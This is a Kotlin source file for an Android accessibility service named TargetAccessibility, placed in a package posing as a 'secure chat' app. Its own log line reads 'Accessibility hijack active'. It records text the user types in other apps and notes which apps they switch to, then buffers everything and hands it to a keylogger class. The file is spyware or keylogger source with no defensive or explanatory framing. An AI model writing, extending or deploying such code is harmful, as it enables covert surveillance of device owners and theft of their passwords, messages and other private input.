package com.secure.chat.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class TargetAccessibility : AccessibilityService() {

    companion object {
        private const val TAG = "TargetAccessibility"
        var isConnected = false
            private set
        var lastTypedText: String = ""
            private set
        private var logBuffer = StringBuilder()
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        isConnected = true
        Log.d(TAG, "Accessibility hijack active")

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            } else {
                @Suppress("DEPRECATION")
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            }
            notificationTimeout = 100
        }
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString("") ?: ""
                if (text.isNotEmpty()) {
                    lastTypedText = text
                    logBuffer.append(text).append("\n")
                    if (logBuffer.length > 10000) {
                        logBuffer = StringBuilder(logBuffer.substring(logBuffer.length - 5000))
                    }
                    // Send to keylogger
                    TargetKeylogger.log(text)
                }
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val packageName = event.packageName?.toString() ?: ""
                val className = event.className?.toString() ?: ""
                if (packageName.isNotEmpty() && !packageName.contains("com.secure.chat")) {
                    logBuffer.append("[WINDOW] $packageName / $className\n")
                    TargetKeylogger.log("\n[APP: $packageName]\n")
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        isConnected = false
    }

    fun getLogs(): String = logBuffer.toString()
    fun clearLogs() { logBuffer.clear() }
}
